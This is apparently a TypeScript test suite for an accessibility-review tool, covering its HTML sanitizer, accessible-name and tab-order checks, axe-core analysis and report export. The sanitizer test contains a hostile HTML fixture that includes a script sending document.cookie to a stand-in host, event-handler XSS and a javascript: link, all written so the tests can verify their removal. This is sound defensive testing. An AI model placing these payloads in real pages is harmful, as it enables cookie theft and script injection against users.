import './boot-dom'; // 必须最先：在 axe-core 加载前安装全局 window/document
import { loadIntoBootDocument, newWindow } from './boot-dom';
import { BUILTIN_CASES } from '../src/lib/builtinCases';
import { prepareDocument } from '../src/lib/sanitize';
import {
  buildLocator,
  checkOcclusion,
  getAccessibleName,
  getRole,
  getTabStopSequence,
  isFocusableElement
} from '../src/lib/inspect';
import { runAxe } from '../src/lib/axe';
import { buildExportBundle } from '../src/lib/report';
import type { ReviewRecord } from '../src/types';

let passed = 0;
let failed = 0;
function ok(cond: boolean, msg: string) {
  if (cond) {
    passed++;
    console.log('  ✓', msg);
  } else {
    failed++;
    console.error('  ✗ FAIL:', msg);
  }
}

/** 在独立 window 中解析 HTML（带 defaultView，等价于 iframe contentDocument） */
function makeDom(html: string): Document {
  return newWindow(html).document;
}

async function main() {
  // ---------- 1. 净化器 ----------
  console.log('\n[1] 净化 / 隔离');
  const malicious = `<!doctype html><html><head>
<link rel="stylesheet" href="https://evil.example/x.css">
<meta http-equiv="refresh" content="0;url=https://evil.example">
<base href="https://evil.example/">
<style>@import url(https://evil.example/a.css); body{background:url(https://evil.example/t.png)}</style>
</head><body>
<script>fetch('https://evil.example?c='+document.cookie)</script>
<iframe src="https://evil.example"></iframe>
<img src=x onerror="alert(1)" src="https://evil.example/pixel.gif">
<a href="javascript:alert(1)" onclick="steal()">xss</a>
<a href="https://evil.example">外链</a>
<a href="#section">页内</a>
<button class="local-btn" onmouseover="x()">本地按钮</button>
</body></html>`;

  const prep = prepareDocument({
    files: { 'index.html': malicious, 'styles.css': 'a{color:red}' },
    entry: 'index.html'
  });
  ok(!prep.srcdoc.includes('<script'), 'script 元素被移除');
  ok(!prep.srcdoc.includes('onerror') && !prep.srcdoc.includes('onclick') && !prep.srcdoc.includes('onmouseover'), '所有 on* 事件属性被移除');
  ok(!prep.srcdoc.includes('https://evil.example'), '所有外链 URL 被移除');
  ok(!prep.srcdoc.includes('javascript:alert'), 'javascript: 协议被移除');
  ok(prep.srcdoc.includes('href="#section"'), '页内锚点保留');
  ok(!prep.srcdoc.includes('@import'), 'CSS @import 被删除');
  ok(prep.srcdoc.includes('Content-Security-Policy'), 'CSP 已注入');
  ok(prep.srcdoc.includes("default-src 'none'"), "CSP default-src 'none'");
  ok(prep.srcdoc.includes('本地按钮'), '正常按钮内容保留');
  ok(prep.logs.some((l) => l.level === 'block'), '净化日志记录了拦截项');

  for (const c of BUILTIN_CASES) {
    const p = prepareDocument({ files: c.files, entry: c.entry });
    const doc = makeDom(p.srcdoc);
    ok(
      doc.querySelectorAll('button,input,a').length >= 3,
      `内置案例「${c.name}」控件保留（${doc.querySelectorAll('button,input,a').length} 个）`
    );
  }

  // ---------- 2. DOM 检查 ----------
  console.log('\n[2] 定位器 / 可访问名称 / Tab 序列');
  const doc = makeDom(`<!doctype html><html><body>
    <button id="okBtn">保存</button>
    <button aria-label="关闭对话框"><span aria-hidden="true">X</span></button>
    <input id="email" type="email" placeholder="邮箱">
    <label for="email2">邮箱地址</label><input id="email2">
    <a href="#">链接</a>
    <div tabindex="0">伪按钮</div>
    <div tabindex="5">插队元素</div>
    <button disabled>禁用</button>
    <img src="x" alt="产品图">
  </body></html>`);

  const btn = doc.getElementById('okBtn')!;
  ok(buildLocator(btn, doc).cssPath === '#okBtn', 'id 元素生成 #id 定位器');
  ok(getAccessibleName(btn, doc) === '保存', '按钮文本可访问名称');
  ok(getAccessibleName(doc.querySelectorAll('button')[1], doc) === '关闭对话框', 'aria-label 名称（aria-hidden 子树不计入）');
  ok(getAccessibleName(doc.getElementById('email')!, doc) === '', '仅 placeholder 的输入框名称为空');
  ok(getAccessibleName(doc.getElementById('email2')!, doc) === '邮箱地址', 'label[for] 关联名称');
  ok(getRole(doc.querySelectorAll('button')[1], doc) === 'button', '角色识别');
  ok(getRole(doc.getElementById('email')!, doc) === 'textbox', 'input 角色');

  const seq = getTabStopSequence(doc);
  const seqInfo = seq.map((e) => e.id || e.tagName + ':' + (e.textContent || '').trim());
  ok(seq.length === 7, `Tab 序列数量正确（${seq.length}，排除 disabled 元素）`);
  ok(seq[0].getAttribute('tabindex') === '5', 'tabindex=5 的元素排在最前');
  ok(!seq.some((e) => (e as HTMLButtonElement).disabled), 'disabled 元素不在 Tab 序列');
  ok(!isFocusableElement(doc.querySelector('img')!, doc), '无 tabindex 的 img 不可聚焦');
  console.log('    序列:', seqInfo.join(' → '));

  // ---------- 3. 遮挡检测（mock 布局） ----------
  console.log('\n[3] 焦点遮挡检测');
  {
    const d = makeDom(`<!doctype html><html><body><button id="b">按钮</button><div id="overlay"></div></body></html>`);
    const b = d.querySelector('#b') as HTMLElement;
    b.getBoundingClientRect = () =>
      ({ x: 10, y: 10, width: 100, height: 30, top: 10, left: 10, right: 110, bottom: 40, toJSON() {} }) as DOMRect;
    d.elementFromPoint = (() => d.querySelector('#overlay')) as Document['elementFromPoint'];
    const res = checkOcclusion(b, d);
    ok(res.occluded === true, '覆盖层遮挡焦点被检出');
    d.elementFromPoint = (() => b) as Document['elementFromPoint'];
    const res2 = checkOcclusion(b, d);
    ok(res2.occluded === false, '无覆盖时通过遮挡检测');
  }

  // ---------- 4. axe 对隔离文档分析 ----------
  console.log('\n[4] axe-core 静态规则');
  {
    const formCase = BUILTIN_CASES.find((c) => c.kind === 'builtin-form')!;
    const p = prepareDocument({ files: formCase.files, entry: formCase.entry });
    // 真实应用中 axe 分析的是同源 iframe 的 contentDocument（与父页同 JS realm）。
    // jsdom 不做布局，桩一个非零尺寸避免元素被判为隐藏（真实浏览器无需此处理）。
    const d = loadIntoBootDocument(p.srcdoc);
    d.querySelectorAll('*').forEach((el) => {
      el.getBoundingClientRect = () =>
        ({ x: 0, y: 0, width: 120, height: 24, top: 0, left: 0, right: 120, bottom: 24, toJSON() {} }) as DOMRect;
      (el as HTMLElement).getClientRects = (() => [{ width: 120, height: 24 }] as unknown) as HTMLElement['getClientRects'];
    });
    const res = await runAxe(d);
    ok(!res.error, `axe 运行无异常${res.error ? '：' + res.error : ''}`);
    const ruleIds = res.violations.map((v) => v.id);
    const incompleteIds = res.incomplete.map((v) => v.id);
    console.log(
      '    违规规则:',
      ruleIds.join(', ') || '(无)',
      `| 无法判定: ${incompleteIds.join(', ') || '(无)'} | 通过 ${res.passes.length} 条`
    );
    ok(ruleIds.includes('label'), '表单案例检出 label 违规（验证码输入框完全无名称来源）');
    // 注意：placeholder 不能替代可见 label，axe 视类型不同可能放行；
    // 该问题在工具中由「键盘实测 + 人工标注」覆盖（见下方名称为空/语义复核）。
    const emailInput = d.getElementById('email')!;
    ok(
      getAccessibleName(emailInput, d) === '' && emailInput.hasAttribute('placeholder'),
      '邮箱输入框仅有 placeholder：AccName 为空，留待实测/人工覆盖'
    );
    ok(
      ruleIds.includes('color-contrast') || incompleteIds.includes('color-contrast'),
      '对比度规则命中（jsdom 无布局可能归为 incomplete，真实浏览器中为违规）'
    );
    const nodes = res.violations.find((v) => v.id === 'label')?.nodes ?? [];
    ok(nodes.length > 0 && !!nodes[0].locator.cssPath, 'axe 节点带定位信息');
  }

  // ---------- 5. 内置案例问题面覆盖 ----------
  console.log('\n[5] 内置案例问题植入检查');
  {
    const modalCase = BUILTIN_CASES.find((c) => c.kind === 'builtin-modal')!;
    const p = prepareDocument({ files: modalCase.files, entry: modalCase.entry });
    const d = makeDom(p.srcdoc);
    const closeBtn = d.getElementById('closeDialogBtn')!;
    ok(getAccessibleName(closeBtn, d) === '更多选项', '弹窗关闭按钮名称与功能不符（人工/实测问题）');
    ok(d.getElementById('settingsDialog')?.getAttribute('role') !== 'dialog', '弹窗缺 dialog 语义');

    const menuCase = BUILTIN_CASES.find((c) => c.kind === 'builtin-menu')!;
    const pm = prepareDocument({ files: menuCase.files, entry: menuCase.entry });
    const dm = makeDom(pm.srcdoc);
    const toggle = dm.getElementById('menuToggle')!;
    ok(getAccessibleName(toggle, dm) === '', '菜单图标按钮无可访问名称');
  }

  // ---------- 6. 报告导出 ----------
  console.log('\n[6] 报告');
  {
    const review: ReviewRecord = {
      id: 'rev-test',
      caseId: 'x',
      caseName: '测试案例',
      startedAt: Date.now(),
      updatedAt: Date.now(),
      issues: [],
      tabOrder: [],
      axePassCount: 42,
      axeViolationCount: 3,
      conclusion: '需修复'
    };
    const bundle = buildExportBundle(review);
    ok(bundle.exportedAt && bundle.isolation.includes('无任何服务端通信'), '导出包含隔离策略说明');
    ok(bundle.disclaimer.includes('不能证明该组件完全无障碍'), '导出包含「通过≠完全无障碍」声明');
  }

  console.log(`\n结果：${passed} 通过 / ${failed} 失败`);
  if (failed > 0) process.exit(1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
